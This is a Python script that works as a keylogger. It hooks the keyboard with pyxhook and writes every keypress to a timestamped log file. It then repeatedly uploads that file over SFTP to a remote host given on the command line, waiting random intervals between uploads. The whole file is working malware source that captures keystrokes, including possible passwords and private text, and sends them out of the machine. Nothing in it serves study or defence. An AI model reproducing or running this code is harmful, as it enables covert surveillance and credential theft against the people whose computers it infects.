import os
import argparse
import time
import random
from datetime import datetime

import pyxhook
import pysftp


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser()
    
    # Add arguments to the parser
    parser.add_argument('-prot', '--protocol', required=True, type=str, default='sftp', help='Protocol to send logged data.')
    parser.add_argument('-host', '--hostname', required=True, type=str, help='Name of hostname')
    parser.add_argument('-u','--username', required=True, type=str)
    parser.add_argument('-pass', '--password', required=True,type=str)
    parser.add_argument('-d', '--destination_path', required=True,type=str)

    # Parse the arguments and return them
    return parser.parse_args()

def run_keylogger(args: argparse.Namespace):
    # Specify the name of the file (can be changed )
    log_file = f'{datetime.now().strftime("%d-%m-%Y_%H:%M")}.log'

    def on_key_press(event):
        with open(log_file, "a") as f:  # Open a file as f with Append (a) mode
            if event.Key == 'P_Enter' :
                f.write('\n')
            else:
                f.write(f"{chr(event.Ascii)}")  # Write to the file and convert ascii to readable characters

    new_hook = pyxhook.HookManager()
    new_hook.KeyDown = on_key_press
    new_hook.HookKeyboard()  # set the hook

    try:
        new_hook.start()  # start the hook
    except KeyboardInterrupt:
        new_hook.cancel()
        pass
    except Exception as ex:
        # Write exceptions to the log file, for analysis later.
        msg = f"Error while catching events:\n  {ex}"
        pyxhook.print_err(msg)
        with open(log_file, "a") as f:
            f.write(f"\n{msg}")
    
    while True:
        with pysftp.Connection(args.hostname, username=args.username, password=args.password) as sftp:
            with sftp.cd(args.destination_path):
                sftp.put(log_file)  
        
        time.sleep(random.randint(a=1, b=150)) 

    sftp.close()



if __name__ == "__main__":
    args = parse_args()
    run_keylogger(args=args)
